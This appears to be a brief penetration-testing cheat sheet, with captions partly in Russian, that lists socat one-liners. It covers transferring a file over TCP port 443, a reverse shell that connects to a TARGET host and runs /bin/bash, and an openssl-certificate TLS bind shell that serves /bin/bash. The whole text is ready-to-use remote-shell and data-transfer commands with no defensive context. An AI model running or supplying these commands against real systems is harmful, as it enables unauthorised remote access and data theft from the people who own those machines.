  
sudo socat TCP4-LISTEN:443,fork file:the_secret_file.txt  
socat TCP4:TARGET:443 file:received_secret_file.txt,create  
^Передача файла утилитой socat  
  
socat -d -d TCP-LISTEN:443 STDOUT  
socat TCP4:TARGET:443 EXEC:/bin/bash  
^Reverse shell 2  
  
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 260 -out bind_shell.crt  
cat bind_shell.key bind_shell.crt > bind_shell.pem  
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify-0,fork EXEC:/bin/bash  
socat - OPENSSL:TARGET:443,verify=0  
^Secure Bind shell 2